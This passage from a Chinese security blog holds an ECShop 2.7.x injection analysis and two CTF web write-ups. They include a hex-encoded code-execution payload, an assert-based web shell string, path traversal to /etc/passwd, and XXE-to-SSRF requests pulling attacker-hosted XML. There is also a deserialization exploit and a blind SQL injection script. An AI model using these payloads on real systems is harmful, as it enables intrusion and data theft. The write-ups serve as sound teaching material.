+<p>id的值就是<code>&#39; /*</code>，num的值<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，0x27202f2a是<code>&#39; /*</code>的16进制值，也就是第二列<code>$row[&#39;position_id&#39;]</code>的值<code>。0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>为<code>{$&#39;];phpinfo/**/();//}</code>的16进制值</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>看到ecshop4/ecshop/includes/lib_insert.php<br><img src="https://images.seebug.org/content/images/2018/09/d542c73a-d3ef-4e89-8394-aa85c7f1332e.png-w331s" alt></p>
+<p>对id和num进行强制类型转换了，字符串无法利用</p>
+<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>创宇WAF拦截的Payload是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc&apos;];assert(base64_decode(&apos;YXNzZXJ0KCRfR0VUWyd4J10pOw==&apos;));//&#125;</span><br></pre></td></tr></table></figure>
+
+<p>巧妙解决了$_GET[]的[]问题，测试用法</p>
+<p><img src="https://i.loli.net/2019/02/02/5c55aa16d0c98.png" alt></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://paper.seebug.org/695/#_5" target="_blank" rel="noopener">https://paper.seebug.org/695/#_5</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/02/02/Echsop2.7.x几处漏洞分析/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/"> 
+                    FireShellCTF2019 Bad Injections解题记录 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-30   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="FireShellCTF2019-Bad-Injections解题记录"><a href="#FireShellCTF2019-Bad-Injections解题记录" class="headerlink" title="FireShellCTF2019 Bad Injections解题记录"></a>FireShellCTF2019 Bad Injections解题记录</h1><p>原文投稿安全客：<a href="https://www.anquanke.com/post/id/170381" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170381</a></p>
+<p>题目名称：Bad Injections</p>
+<p>题目地址：<a href="http://68.183.31.62:94" target="_blank" rel="noopener">http://68.183.31.62:94</a></p>
+<p>貌似现在还没有关环境，这是整场比赛最简单的Web题…Web题质量很高，表哥们可以趁环境在去爽一下</p>
+<p>主页面有四个功能，纯静态页面。右键about页面源码信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7566b0a62.png" alt></p>
+<p>给个本地web目录</p>
+<p>接着在list页面的源码里发现信息：<br><img src="https://i.loli.net/2019/01/28/5c4e7581ec7bc.png" alt></p>
+<p>因为页面显示图片，url没有其他参数，猜测应该是readfile之类的函数读的文件。File+hash的方法，既然是ctf，那hash应该不会加key。下载一个文件试一下能不能成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../../../../etc/passwd&amp;hash=ab56ade6fe16a65bce82a7cd833f13cc</span><br></pre></td></tr></table></figure>
+
+<p>这里让<code>hash = md5(file)</code>，成功下载到了/etc/passwd<br><img src="https://i.loli.net/2019/01/28/5c4e75df5ff3d.png" alt></p>
+<p>尝试去读/flag发现文件不存在，去读.bash_history也不存在..捷径失败…</p>
+<p>看到之前list下载的test.txt内容是这样的<br><img src="https://i.loli.net/2019/01/28/5c4e75f994d2c.png" alt></p>
+<p>down一下download的源码，顺便fuzz一下Controllers的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../app/Controllers/Download.php&amp;hash=f350edcfda52eb0127c4410633efd260</span><br></pre></td></tr></table></figure>
+
+<p>字典只跑出来了个admin.php<br><img src="https://i.loli.net/2019/01/28/5c4e7631e6291.png" alt></p>
+<p>看了源码感觉存在一个XXE或者是create_function的代码注入，因为找不到/flag所以利用XXE没什么卵用，应该就是代码注入点，但是要加载外部文本来引入正确xml文本才能进入函数判断。</p>
+<p>尝试请求admin?url=xxx&amp;order=xx死活获取不到页面，应该是路由没找对。在这卡了一会，请教腹黑师傅，才想起来去读入口文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68.183.31.62:94/download?file=files/../../app/Index.php&amp;hash=1dfd7acd700544ea7d26b8368935c4e8</span><br></pre></td></tr></table></figure>
+
+<p>/app/index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;display_errors&apos;,1);</span><br><span class="line">ini_set(&apos;display_startup_erros&apos;,1);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">require_once(&apos;Routes.php&apos;);</span><br><span class="line"></span><br><span class="line">function __autoload($class_name)&#123;</span><br><span class="line">  if(file_exists(&apos;./classes/&apos;.$class_name.&apos;.php&apos;))&#123;</span><br><span class="line">    require_once &apos;./classes/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">  &#125;else if(file_exists(&apos;./Controllers/&apos;.$class_name.&apos;.php&apos;))&#123;</span><br><span class="line">    require_once &apos;./Controllers/&apos;.$class_name.&apos;.php&apos;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再去读路由/app/Routes.php，看看是个什么狗屁规则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index.php&apos;,function()&#123;</span><br><span class="line">  Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line">  Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;about-us&apos;,function()&#123;</span><br><span class="line">  AboutUs::createView(&apos;AboutUs&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;contact-us&apos;,function()&#123;</span><br><span class="line">  ContactUs::createView(&apos;ContactUs&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;list&apos;,function()&#123;</span><br><span class="line">  ContactUs::createView(&apos;Lista&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;verify&apos;,function()&#123;   </span><br><span class="line">  if(!isset($_GET[&apos;file&apos;]) &amp;&amp; !isset($_GET[&apos;hash&apos;]))&#123;</span><br><span class="line">    Verify::createView(&apos;Verify&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Verify::verifyFile($_GET[&apos;file&apos;],$_GET[&apos;hash&apos;]);  //设置session，file和hash对应请求文件</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Route::set(&apos;download&apos;,function()&#123;</span><br><span class="line">  if(isset($_REQUEST[&apos;file&apos;]) &amp;&amp; isset($_REQUEST[&apos;hash&apos;]))&#123;</span><br><span class="line">    echo Download::downloadFile($_REQUEST[&apos;file&apos;],$_REQUEST[&apos;hash&apos;]);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    echo &apos;jdas&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;verify/download&apos;,function()&#123;</span><br><span class="line">  Verify::downloadFile($_REQUEST[&apos;file&apos;],$_REQUEST[&apos;hash&apos;]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Route::set(&apos;custom&apos;,function()&#123;</span><br><span class="line">  $handler = fopen(&apos;php://input&apos;,&apos;r&apos;);</span><br><span class="line">  $data = stream_get_contents($handler); // xml</span><br><span class="line">  if(strlen($data) &gt; 1)&#123;</span><br><span class="line">    Custom::Test($data);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Custom::createView(&apos;Custom&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;admin&apos;,function()&#123;</span><br><span class="line">  if(!isset($_REQUEST[&apos;rss&apos;]) &amp;&amp; !isset($_REQUES[&apos;order&apos;]))&#123;</span><br><span class="line">    Admin::createView(&apos;Admin&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">     echo &quot;;(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(&apos;custom/sort&apos;,function()&#123;</span><br><span class="line">  Custom::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">&#125;);</span><br><span class="line">Route::set(&apos;index&apos;,function()&#123;</span><br><span class="line"> Index::createView(&apos;Index&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>原来我只下载了download和admin页面，还有其它功能页面没下载到，看到了玄学的admin规则如下，原来只有本地才能请求到sort函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Route::set(&apos;admin&apos;,function()&#123;</span><br><span class="line">  if(!isset($_REQUEST[&apos;rss&apos;]) &amp;&amp; !isset($_REQUES[&apos;order&apos;]))&#123;</span><br><span class="line">    Admin::createView(&apos;Admin&apos;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    if($_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;127.0.0.1&apos; || $_SERVER[&apos;REMOTE_ADDR&apos;] == &apos;::1&apos;)&#123;</span><br><span class="line">      Admin::sort($_REQUEST[&apos;rss&apos;],$_REQUEST[&apos;order&apos;]);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">     echo &quot;;(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>找一下其他利用，再看Custom</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Route::set(&apos;custom&apos;,function()&#123;</span><br><span class="line">  $handler = fopen(&apos;php://input&apos;,&apos;r&apos;);</span><br><span class="line">  $data = stream_get_contents($handler); </span><br><span class="line">  if(strlen($data) &gt; 1)&#123;</span><br><span class="line">    Custom::Test($data);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    Custom::createView(&apos;Custom&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>Custom::Test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Custom extends Controller&#123;</span><br><span class="line">  public static function Test($string)&#123;</span><br><span class="line">      $root = simplexml_load_string($string,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">      $test = $root-&gt;name;</span><br><span class="line">      echo $test;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$data内容可控为php://input，Test函数再将$data作为xml文本解析，那么存在XXE的问题，验证了一下可以利用<br><img src="https://i.loli.net/2019/01/28/5c4e7655ea8f6.png" alt></p>
+<p>联想到刚才admin页面只有本地才能请求，那就用Custom的XXE当跳板好了，测试一下是否能当跳板</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt; </span><br><span class="line">&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fyour_vps%2Fxxe.txt&amp;order=1&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/01/28/5c4e7677a9567.png" alt><br>admin页面确实file_get_contents到了我vps的xxe文本。</p>
+<p>尝试去构造正确的xml文本到执行到usort函数进行注入，warning不影响代码执行</p>
+<p><code>http://vps/xxe.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;link&gt;@hpdoger.me&lt;/link&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;link&gt;@souhu.com&lt;/link&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>POC</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt; </span><br><span class="line">&lt;!DOCTYPE name [&lt;!ENTITY  file SYSTEM &quot;http://localhost/admin?rss=http%3A%2F%2Fvps%2Fxxe.txt&amp;order=id%29%3B%7Decho%28file_get_contents%28%27..%2F..%2F..%2Fda0f72d5d79169971b62a479c34198e7%27%29%29%3B%2F%2F&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/01/28/5c4e768d57f89.png" alt></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 
+                    安恒杯月赛19新年场WriteUp 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-26   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1); </span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;skyobj = new sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing; </span><br><span class="line">    function read()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;nice = unserialize($this-&gt;amzing);</span><br><span class="line">        $this-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;you must be joking!&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class sec </span><br><span class="line">&#123;  </span><br><span class="line">    function read()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;it&apos;s so sec~~&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;data&apos;]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[&apos;data&apos;]);</span><br><span class="line">    echo $Input_data; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(&quot;./index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p>
+<p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p>
+<p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">    $this-&gt;skyobj = new cool;</span><br><span class="line">    $this-&gt;skyobj-&gt;amzing = serialize(new sec);</span><br><span class="line">    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sec </span><br><span class="line">&#123;</span><br><span class="line">    function read()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123; </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$test = new baby();</span><br><span class="line">echo urlencode(serialize($test));</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p>
+<p>登陆后盲注</p>
+<p>EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(payload):</span><br><span class="line">    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)</span><br><span class="line">    # print &quot;[+] %s&quot; % (url)</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    cookies = &#123;&apos;PHPSESSID&apos;: &apos;3kus5jrhoqav8te0kf74hglii7&apos;&#125;</span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line">    # content = response.content</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    offset = after_time - before_time</span><br><span class="line">    # print &quot;[*] Offset : %f&quot; % (offset)</span><br><span class="line">    if offset &gt; 2.5:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    data = &quot;&quot;</span><br><span class="line">    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">    for i in range(1, 40, 1):</span><br><span class="line">        for j in charaters:</span><br><span class="line">            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&apos;%s&apos;,sleep(3),0)%%23&quot; % (i, j)</span><br><span class="line">            if login(payload):</span><br><span class="line">                data += str(j)</span><br><span class="line">                print &quot;[+] Found : %s&quot; % (data)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e zhu.jpg</span><br></pre></td></tr></table></figure>
+
+<p>Stegsolve</p>
+<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility imageinfo -f memory #分析操作系统</span><br><span class="line">volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p>
+<p>得到管理员hash如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</span><br></pre></td></tr></table></figure>
+
+<p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/01/26/安恒杯月赛19新年场WriteUp/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
